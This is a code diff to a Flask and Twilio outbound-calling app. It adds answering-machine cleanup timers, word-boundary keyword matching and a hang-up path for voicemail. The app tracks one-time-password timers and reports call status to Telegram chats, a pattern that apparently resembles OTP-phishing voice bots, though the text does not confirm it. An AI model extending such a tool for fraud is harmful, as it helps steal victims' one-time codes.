@@ -1607,6 +1607,7 @@ def get_request_voice_info(call_sid: str, user_id: str = "unknown") -> tuple[str
 # OTP TIMER HELPERS
 # ======================================================================
 _otp_timers = {}
+_async_amd_timers: Dict[str, threading.Timer] = {}
 
 
 def store_otp_timer(call_sid: str, timer: threading.Timer) -> None:
@@ -1630,10 +1631,32 @@ def cancel_otp_timer(call_sid: str) -> None:
             pass
 
 
+def store_amd_cleanup_timer(call_sid: str, timer: threading.Timer) -> None:
+    if not call_sid or not timer:
+        return
+    existing = _async_amd_timers.get(call_sid)
+    if existing is not None:
+        try:
+            existing.cancel()
+        except Exception:
+            pass
+    _async_amd_timers[call_sid] = timer
+
+
+def cancel_amd_cleanup_timer(call_sid: str) -> None:
+    timer = _async_amd_timers.pop(call_sid, None)
+    if timer is not None:
+        try:
+            timer.cancel()
+        except Exception:
+            pass
+
+
 def cleanup_call_session(call_sid: str) -> None:
     if not call_sid:
         return
     cancel_otp_timer(call_sid)
+    cancel_amd_cleanup_timer(call_sid)
     session = get_call_session(call_sid)
     manager = get_session_manager()
     try:
@@ -3490,6 +3513,12 @@ def amd_callback():
                 except Exception:
                     logger.debug("Failed to notify chat from AMD callback")
 
+        if session is not None and session.get("call_completed") and session.get("awaiting_async_amd"):
+            # Call already ended, but AMD verdict arrived after completion.
+            # Finalize the session now that we know the answer type.
+            session["awaiting_async_amd"] = False
+            cleanup_call_session(call_sid)
+
         # Also return the legacy handlers' response if any (call into handlers module)
         try:
             # Keep backward compatibility: allow handlers' AMD hook to run if it exists
@@ -3817,10 +3846,20 @@ def voice():
     return Response(str(resp), content_type="application/xml")
 
 
-def _is_positive_acknowledgment(text: str) -> bool:
-    if not text:
+def _text_contains_term(text: str, signals: list[str]) -> bool:
+    if not text or not signals:
         return False
     normalized = text.strip().lower()
+    for signal in signals:
+        if not signal:
+            continue
+        pattern = fr"\b{re.escape(signal)}\b"
+        if re.search(pattern, normalized):
+            return True
+    return False
+
+
+def _is_positive_acknowledgment(text: str) -> bool:
     positive_signals = [
         "yes",
         "yeah",
@@ -3833,13 +3872,10 @@ def _is_positive_acknowledgment(text: str) -> bool:
         "i'm here",
         "i am here",
     ]
-    return any(signal in normalized for signal in positive_signals)
+    return _text_contains_term(text, positive_signals)
 
 
 def _looks_like_machine_or_voicemail(text: str) -> bool:
-    if not text:
-        return False
-    normalized = text.strip().lower()
     machine_signals = [
         "voicemail",
         "recorded",
@@ -3853,7 +3889,7 @@ def _looks_like_machine_or_voicemail(text: str) -> bool:
         "press 1",
         "press one",
     ]
-    return any(signal in normalized for signal in machine_signals)
+    return _text_contains_term(text, machine_signals)
 
 
 @app.route("/handle_greeting", methods=["POST"])
@@ -4091,6 +4127,14 @@ def handle_acknowledgment():
     logger.info(
         f"[ACK] call_sid={call_sid[:8] if call_sid else 'unknown'} speech={speech_result or 'none'} digits={digits or 'none'} ack_attempts={session.get('ack_attempts')} user={user_id}"
     )
+
+    if _looks_like_machine_or_voicemail(speech_result):
+        if chat_id is not None:
+            send_telegram_status(chat_id, "📞 A machine or voicemail answered the call. Ending the call gracefully.")
+        resp = VoiceResponse()
+        resp.say("Thank you. Goodbye.")
+        resp.hangup()
+        return Response(str(resp), content_type="application/xml")
 
     if digits == "1" or _is_positive_acknowledgment(speech_result):
         if chat_id is not None:
@@ -4665,6 +4709,22 @@ def twilio_status():
                     return Response("OK", status=200)
 
         if final_status and call_sid:
+            if status == "completed":
+                session = get_call_session(call_sid)
+                if session is not None:
+                    session["call_completed"] = True
+                answer_key = (answered_by or "unknown").lower()
+                if answer_key in {"unknown", ""} and session is not None:
+                    session["awaiting_async_amd"] = True
+                    logger.info(f"Call {call_sid} completed before AMD verdict; waiting for async AMD callback")
+                    # Keep the session alive until async AMD callback arrives
+                    def _cleanup_after_delay():
+                        cleanup_call_session(call_sid)
+                    timer = threading.Timer(45.0, _cleanup_after_delay)
+                    timer.daemon = True
+                    store_amd_cleanup_timer(call_sid, timer)
+                    timer.start()
+                    return Response("OK", status=200)
             if status == "completed":
                 try:
                     # The recording is handled by Twilio's recording callback (/twilio/recording)
